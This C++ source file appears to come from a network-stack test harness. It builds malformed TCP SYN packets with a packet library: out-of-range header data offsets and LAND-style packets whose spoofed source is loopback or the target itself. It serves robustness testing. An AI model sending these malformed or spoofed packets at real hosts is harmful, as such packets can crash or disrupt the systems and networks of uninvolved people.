// TCPAttacks.cpp : Contains the Sparta code for various TCP layer attacks
//

#include "stdafx.h"
#include "AttackConstants.h"

//==================================================================================
// SendTCPSYNPacket
//----------------------------------------------------------------------------------
//
// Description: Function that sends a TCP packet
//
// Arguments:
//
// Returns:
//	TRUE if successful, FALSE otherwise
//==================================================================================
BOOL SendTCPSYNPacket(CInterface *pInterface, CHAR *szDestMac, CHAR *szDestIP, WORD wDestPort, CHAR *szSourceIP, WORD wSourcePort, WORD wHeaderLength, BOOL fCalcHdrLen)
{
	CHAR szFormattedDestMac[18];
	BOOL fSuccess = TRUE;

	if(!szDestMac || (strlen(szDestMac) < 12))
		return FALSE;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
    {
		// Create a TCP packet
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
        CTCPPacket TCPPacket(MediaType);
    
		// Create Mac addresses for the source and destination
        CMacAddress ClientMacAddr(MediaType, szFormattedDestMac); 
    
        TCPPacket.MacHeader.SetDestAddress(ClientMacAddr);
        TCPPacket.MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
        TCPPacket.MacHeader.SetProtocolType(PROTOCOL_TYPE_IP4);
    
        TCPPacket.IPHeader.SetVersion(4);
        TCPPacket.IPHeader.SetTOS(0);
        TCPPacket.IPHeader.SetID(1);
        TCPPacket.IPHeader.SetTTL(1);
        TCPPacket.IPHeader.SetFragOffset(0);
        TCPPacket.IPHeader.SetFlag(0);
        TCPPacket.IPHeader.SetProtocolType(PROTOCOL_TYPE_TCP);
        TCPPacket.IPHeader.SetDestAddr(szDestIP);
        TCPPacket.IPHeader.SetSrcAddr(szSourceIP);
    
        TCPPacket.TCPHeader.SetSrcPort(wSourcePort);
        TCPPacket.TCPHeader.SetDestPort(wDestPort);
        TCPPacket.TCPHeader.SetSeqNumber((INT) GetTickCount());
        TCPPacket.TCPHeader.SetAckNumber(0);
        TCPPacket.TCPHeader.SetFlag(TCP_SYN);
		TCPPacket.TCPHeader.SetWindowSize(17016);

		if(!fCalcHdrLen)
		{
			TCPPacket.TCPHeader.SetAutoCalcLength(OFF);
			TCPPacket.TCPHeader.SetHdrLength(wHeaderLength);
		}

		TCPPacket.TCPHeader.Options[0].AddMSS(MSS_DEFAULT);

        pInterface->Send(TCPPacket);
    }
    catch(CSpartaException *Ex)
    {
		fSuccess = FALSE;
        delete Ex;
    }

    return fSuccess;
}

//==================================================================================
// TCPDataOffBelowMinAttack
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with a data offset that is lower than the
// minimum header length of a TCP packet
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPDataOffBelowMinAttack(CInterface *pInterface, CHAR *szDestMac)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPSYNPacket(pInterface, szDestMac, IPADDR_DEST, TCPPORT_SOURCE, IPADDR_SOURCE, TCPPORT_DEST, 16, FALSE);
}

//==================================================================================
// TCPDataOffAboveAvailAttack
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with a data offset that is the maximum value
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPDataOffAboveAvailAttack(CInterface *pInterface, CHAR *szDestMac)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPSYNPacket(pInterface, szDestMac, IPADDR_DEST, TCPPORT_SOURCE, IPADDR_SOURCE, TCPPORT_DEST, 60, FALSE);
}

//==================================================================================
// TCPLand1Attack
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with the return address set to the target address
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPLand1Attack(CInterface *pInterface, CHAR *szDestMac)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPSYNPacket(pInterface, szDestMac, IPADDR_DEST, TCPPORT_SOURCE, IPADDR_LOOPBACK, TCPPORT_DEST, 0, TRUE);
}

//==================================================================================
// TCPLand2Attack
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with the return address set to the target address
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPLand2Attack(CInterface *pInterface, CHAR *szDestMac)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPSYNPacket(pInterface, szDestMac, IPADDR_DEST, TCPPORT_SOURCE, IPADDR_SOURCE, TCPPORT_DEST, 0, TRUE);
}

PATTACK_FUNCTION g_TCPAttackFunctions[TCPATTACK_MAXTEST] = 
{
	TCPDataOffBelowMinAttack,
	TCPDataOffAboveAvailAttack,
	TCPLand1Attack,
	TCPLand2Attack
};
